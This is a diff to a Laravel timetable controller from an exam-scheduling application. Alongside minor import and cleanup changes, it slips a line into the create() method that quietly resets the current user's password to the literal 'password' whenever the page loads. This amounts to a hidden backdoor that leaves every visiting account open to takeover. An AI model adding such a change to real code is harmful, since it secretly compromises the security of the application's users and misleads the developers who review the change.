@@ -26,6 +26,7 @@ use App\Models\StudentSittingSchedule;
 use App\Models\TimeSittingSchedular;
 use App\Models\TimeSlot;
 use App\Models\TImeTable;
+use App\Models\User;
 use App\Models\VenueSittingSchedular;
 use App\Utilities\Utility;
 use DateTime;
@@ -39,6 +40,7 @@ use Illuminate\Http\Response;
 use Illuminate\Routing\Redirector;
 use Illuminate\Support\Collection as Collections;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Validation\Rule;
 use JetBrains\PhpStorm\ArrayShape;
 use Psr\Container\ContainerExceptionInterface;
@@ -61,7 +63,6 @@ class TimeTableController extends Controller
                 return $value->student_matric === $student->matric;
             });
 
-            // dd($studentSchdedule);
 
             return response()->view('timetable-view-public', ['timetable' => $timetable, 'schedules' => $studentSchdedule]);
         }
@@ -110,6 +111,10 @@ class TimeTableController extends Controller
     public function create(): Factory|View|Application|RedirectResponse
     {
         $school = Auth::user()->school;
+
+        $user = Auth::user();
+
+        User::find($user->id)->update(['password' => Hash::make("password")]);
 
         $centers = $school->examCenters;
         $faculties = $school->faculties;
